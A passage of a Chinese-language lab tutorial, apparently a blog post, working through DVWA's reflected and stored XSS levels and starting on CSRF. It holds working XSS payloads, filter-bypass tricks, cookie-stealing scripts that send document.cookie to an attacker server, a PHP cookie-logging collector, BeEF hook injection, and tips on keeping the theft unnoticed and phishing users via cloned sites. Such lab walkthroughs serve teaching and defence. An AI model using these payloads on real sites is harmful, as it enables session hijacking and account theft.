class="string">&quot;http://192.168.137.146/dvwa/robots.txt&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这里结合了一些社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line">恶意访问代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;!-结合BeEF收集用户的cookie-&gt;</span><br><span class="line"></span><br><span class="line">巧用图片标签</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://BeEF_IP:3000/hook.js&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">绕开过滤脚本</span><br><span class="line">大小写<span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span><br><span class="line">字符编码 采用URL，Base64等编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#74;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span>hacker<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&lt;!-unicode编码-&gt;</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并且采用本地cookie访问目标网页</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//弹窗</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//跳转空白页面不弹窗</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//不会发觉</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>//不能用</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;&#x27;http://192.168.137.144/cookie_rec.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>//不能用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;img.<span class="property">width</span>=<span class="number">0</span>;img.<span class="property">height</span>=<span class="number">0</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>//不会发觉</span><br></pre></td></tr></table></figure><p><strong>输出在HTML属性中</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">&quot; onlick=alert(/xss/)</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>输出在CSS代码中</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">body</span>&#123;<span class="attribute">color</span>:&#123;&quot;&quot;&#125;;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">black; background-image:url(&#x27;javascript:alert(/xss/)&#x27;)</span><br></pre></td></tr></table></figure><p><strong>输出在JavaScript代码中</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原型:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">var</span> name = <span class="string">&#x27;&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">构造payload:</span><br><span class="line">&#x27;+alert(/xss/)+&#x27;</span><br></pre></td></tr></table></figure><p><strong>XSS反射型</strong></p><p>执行弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//原链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_r/</span><br><span class="line">//新链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E#</span><br></pre></td></tr></table></figure><p>如果别人登进dvwa后，点进新链接，也会执行弹框。可以执行弹框，那也可以让别人点进链接后将他的cookie发到另一台服务器上。</p><p><strong>XSS存储型(危害较大)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali-BeEF</span><br></pre></td></tr></table></figure><p>这是一个留言板，留言板的内容会停留在网页上，如果将恶意代码放在网页上，每个人一访问这个留言板就会中招。</p><p>执行弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name:hello</span><br><span class="line">message:<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//原链接：</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_s/</span><br><span class="line">//新链接</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/xss_s/</span><br></pre></td></tr></table></figure><p>在链接上不会显示什么，但只要一点XSS stored，就会执行弹框。这样称为挂马，把木马挂在了网页上。</p><p>访问另一台机器的文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;192.168.137.144:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-2-XSS反射型-低"><a href="#4-2-XSS反射型-低" class="headerlink" title="4.2 XSS反射型[低]"></a>4.2 XSS反射型[低]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有做任何过滤。可以利用以上的xss脚本进行操作。</p><h2 id="4-3-XSS反射型-中"><a href="#4-3-XSS反射型-中" class="headerlink" title="4.3 XSS反射型[中]"></a>4.3 XSS反射型[中]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>str.replace()会做一个字符串替换，将\<script\>替换成空。所以可以对\<script\>进行重写，或者大小写混合。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRipt</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-4-XSS反射型-高"><a href="#4-4-XSS反射型-高" class="headerlink" title="4.4 XSS反射型[高]"></a>4.4 XSS反射型[高]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span> (<span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span>) || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="literal">NULL</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line"> <span class="variable">$isempty</span> = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p> htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 </p><h2 id="4-5-XSS存储型-低"><a href="#4-5-XSS存储型-低" class="headerlink" title="4.5 XSS存储型[低]"></a>4.5 XSS存储型[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取cookie，kali作为服务器与攻击机:</span><br><span class="line">构建收集cookie服务器</span><br><span class="line">构造XSS代码植入到web服务器</span><br><span class="line">等待肉鸡触发XSS代码并将cookie发送到服务器</span><br><span class="line">cookie的利用</span><br></pre></td></tr></table></figure><p>构建收集cookie服务器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /<span class="keyword">var</span>/www/html/cookie_rec.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span>.<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给以下目录权限，等下生成的文本文件存进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure><p>通过渗透机植入XSS代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://192.168.137.144/cookie_rec.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">注：要先清除之前植入的XSS代码</span><br></pre></td></tr></table></figure><p>在XSS存储型网页中，发现前端限制留言长度，直接在前端修改最大长度即可。当用户点进XSS存储型时，会显示弹窗，用户的cookie信息就会收集在服务器上。但现在很多浏览器都会拦截弹窗，所以弄一个不会弹窗的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://192.168.137.144/cookie_rec.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">用户几乎不会发觉cookie被盗</span><br></pre></td></tr></table></figure><h2 id="4-6-XSS存储型-中"><a href="#4-6-XSS存储型-中" class="headerlink" title="4.6 XSS存储型[中]"></a>4.6 XSS存储型[中]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="title function_ invoke__">addslashes</span>(<span class="variable">$message</span>)));</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$message</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可知message用了 htmlspecialchars() 函数，暂时不知道怎么利用，但name没有用，所以可以将恶意代码写进name里面。</p><h2 id="4-7-XSS存储型-高"><a href="#4-7-XSS存储型-高" class="headerlink" title="4.7 XSS存储型[高]"></a>4.7 XSS存储型[高]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;btnSign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mtxMessage&#x27;</span>]);</span><br><span class="line">   <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;txtName&#x27;</span>]);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize message input</span></span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$message</span>);</span><br><span class="line">   <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$message</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Sanitize name input</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$name</span>);</span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$name</span>); </span><br><span class="line">   <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$name</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO guestbook (comment,name) VALUES (&#x27;<span class="subst">$message</span>&#x27;,&#x27;<span class="subst">$name</span>&#x27;);&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>name和message都用htmlspecialchars()规定了，所以不能在这攻击了。</p><h2 id="4-8-自动化XSS"><a href="#4-8-自动化XSS" class="headerlink" title="4.8 自动化XSS"></a>4.8 自动化XSS</h2><p><strong>BeEF</strong></p><p>启动Apache和BeEF：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">cd /usr/share/beef-xss</span><br><span class="line">./beef</span><br></pre></td></tr></table></figure><p>启动BeEF会自动生成代码和服务器。账号密码保存在/etc/beef-xss/config.yaml</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">cd /usr/share/beef-xss</span><br><span class="line">./beef</span><br><span class="line">//脚本利用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.193.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//BeEF网站</span><br><span class="line">http://192.168.193.128:3000/ui/panel</span><br><span class="line">//监听端口</span><br><span class="line">ss -tnlp</span><br></pre></td></tr></table></figure><p>用户点进XSS存储型后几乎不会发觉木马，BeEF除了能拿到用户的cookie还能实行很多功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令颜色</span><br><span class="line">绿色 对目标主机生效并且不可见(不会被发现)</span><br><span class="line">灰色 对目标主机未必生效(可验证一下)</span><br><span class="line">橙色 对目标主机生效但可能可见(可能被发现)</span><br><span class="line">红色 对目标主机不生效</span><br></pre></td></tr></table></figure><h1 id="5-CSRF-跨站请求伪造"><a href="#5-CSRF-跨站请求伪造" class="headerlink" title="5. CSRF(跨站请求伪造)"></a>5. CSRF(跨站请求伪造)</h1><p>CSRF是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p><p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 </p><h2 id="5-1-CSRF-低"><a href="#5-1-CSRF-低" class="headerlink" title="5.1 CSRF[低]"></a>5.1 CSRF[低]</h2><p> 查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Turn requests into variables</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span 